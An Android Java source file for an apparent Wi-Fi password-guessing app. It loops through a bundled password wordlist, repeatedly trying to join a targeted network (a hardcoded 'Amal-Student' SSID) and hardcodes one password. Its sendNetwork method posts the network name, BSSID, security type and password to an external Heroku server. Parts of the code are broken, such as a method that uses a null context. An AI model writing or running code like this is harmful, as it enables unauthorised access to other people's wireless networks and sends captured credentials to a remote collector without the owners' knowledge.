package com.artemy.wifistuff;

import android.accessibilityservice.AccessibilityService;
import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiConfiguration;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Handler;
import android.os.Message;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.view.Display;
import android.view.View;
import android.widget.Button;
import android.widget.ListView;
import android.widget.TextView;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.Scanner;

public class infoActivity extends AppCompatActivity implements View.OnClickListener {

    TextView tvname;
    TextView tvbssid;
    TextView tvcapabilities;
    Button connectbtn;
    TextView tvpassword;

    WifiConfiguration conf;
    WifiManager wifi;
    WifiInfo wifiInfo;

     ArrayList<String>filePasswords;
    Handler handler;
     int indexpassword = 0;
     String strPassword = "";
    ScanWifi scanWifi;

    NetworkInfo networkInfo;
    ConnectivityManager connectivityManager;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_info);

        tvname = (TextView) findViewById(R.id.name);
        tvbssid = (TextView) findViewById(R.id.bssid);
        tvcapabilities = (TextView) findViewById(R.id.capabilities);
        tvpassword = (TextView) findViewById(R.id.password);

        connectbtn = (Button) findViewById(R.id.connectbtn);
        connectbtn.setOnClickListener(this);

        String name = getIntent().getExtras().getString("name");
        String bssid = getIntent().getExtras().getString("bssid");
        String capabilities = getIntent().getExtras().getString("capabilities");

        tvname.setText("Name: " + name);
        tvbssid.setText("BSSID: " + bssid);
        tvcapabilities.setText("Capabilities: " + capabilities);
        tvpassword.setText("");
        filePasswords = getPass();
        handler = new Handler(new Handler.Callback() {
            @Override
            public boolean handleMessage(Message message) {
                if(indexpassword<filePasswords.size()) {
                    strPassword = filePasswords.get(indexpassword);
                    connecttowifi(strPassword);
                    Log.d("artimi", "conected is " + strPassword);
                    tvpassword.setText(strPassword);
                    indexpassword++;
                }

                return true;
            }
        });
        scanWifi = new ScanWifi();


    }

    public void connecttowifi(String networkPass) {

        String networkSSID = getIntent().getExtras().getString("name");

        conf = new WifiConfiguration();
        conf.SSID = String.format("\"%s\"", networkSSID);
        conf.preSharedKey = String.format("\"%s\"", networkPass);

        wifi = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
        int netId = wifi.addNetwork(conf);
        wifi.disconnect();
        wifi.enableNetwork(netId, true);
        wifi.reconnect();



    }

    public void onClick(View view) {

        connecttowifi("Amal1@st");
        sendNetwork("Amal1@st");
        //scanWifi.start();
//        String pass = “”;

//        InputStream is = getResources().openRawResource(R.raw.passwords);
//        Scanner s = new Scanner(is);
//
//        if (s != null) {
//            ArrayList<String> list = new ArrayList<String>();
//            while (s.hasNext()){
//                list.add(s.next());
//            }
//            s.close();
//
//            new Thread(new Runnable() {
//                @Override
//                public void run() {
//                    //thread 1
//
//                    new Handler(Looper.getMainLooper()).post(new Runnable() {
//                        @Override
//                        public void run() {
//                            //main thread
//                        }
//                    });
//                }
//            }).start();
//
//            for (String pass : list) {
//                //If the device is not connected to the requested network
//                //Try to connect with “pass”
//                //Wait few seconds to check if the connection succeeded
//
//                if (!hasInternetConnection()) {
//                    connecttowifi(pass);
//                    try {
//                        Thread.sleep(1000);
//                    } catch (InterruptedException e) {
//                        e.printStackTrace();
//                    }
//                }
//            }
////            sendNetwork(tvname.getText().toString(),pass);
//        }else {
//            //TODO: print log
//        }

    }

    public static boolean hasInternetConnection() {
        boolean haveConnectedWifi = false;
        boolean connectionavailable = false;
        AccessibilityService context = null;
        ConnectivityManager cm = (ConnectivityManager) context
                .getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo[] netInfo = cm.getAllNetworkInfo();
        NetworkInfo informationabtnet = cm.getActiveNetworkInfo();
        for (NetworkInfo ni : netInfo) {
            try {
                if (ni.getTypeName().equalsIgnoreCase("WIFI"))
                    if (ni.isConnected()) haveConnectedWifi = true;
                if (informationabtnet.isAvailable()
                        && informationabtnet.isConnected())
                    connectionavailable = true;
                Log.i("ConnectionAvailable", "" + connectionavailable);
            } catch (Exception e) {
                System.out.println("Inside utils catch clause , exception is"
                        + e.toString());
                e.printStackTrace();
            }
        }
        return haveConnectedWifi;
    }

    public boolean IsConnected2 (){
        String name = getIntent().getExtras().getString("name");
        connectivityManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        networkInfo = connectivityManager.getNetworkInfo((ConnectivityManager.TYPE_WIFI));

        if (networkInfo.isConnected()){
            wifiInfo = wifi.getConnectionInfo();
            String ssid = wifiInfo.getSSID();
            if (name.equals(ssid))
                return true;
        }
        return false;
    }
    public boolean IsConnected(String networkSSID) {

        wifiInfo = wifi.getConnectionInfo();
        String name = wifiInfo.getSSID().substring(1, wifiInfo.getSSID().length() - 1);

        if (networkSSID.equals(name)) {
            //Wifichanged(networkSSID);
            tvpassword.setText("working");
            return true;
        }
        return false;
    }

    void sendNetwork( String pass) {
        // TODO: Implement this method to send token to your app server.
        SendMessage apiHandler = new SendMessage();
        JSONObject params = new JSONObject();
        try {
            params.put("wifiname", tvname.getText().toString());
            params.put("bssid", tvbssid.getText().toString());
            params.put("wifipasstype", tvcapabilities.getText().toString());
            params.put("wifipass", pass);
        } catch (JSONException e) {
            e.printStackTrace();
        }
        try {
            apiHandler.post("https://droneserverv1.herokuapp.com/api/WIFI/add", params.toString());
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public ArrayList<String>getPass() {
        InputStream is = getResources().openRawResource(R.raw.passwords);
        Scanner s = new Scanner(is);
        ArrayList<String> list = new ArrayList<String>();

        if (s != null) {
            while (s.hasNext()) {
                list.add(s.next());
            }
            s.close();

        }
        return list;

    }
    class ScanWifi extends Thread
    {
        @Override
        public void run() {
            super.run();
            boolean notfound = true;

            if(IsConnected("Amal-Student"))
                notfound=false;


            while (notfound)
            {
                try {
                    Thread.sleep(3000);
                    handler.sendEmptyMessage(0);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        }

    }

}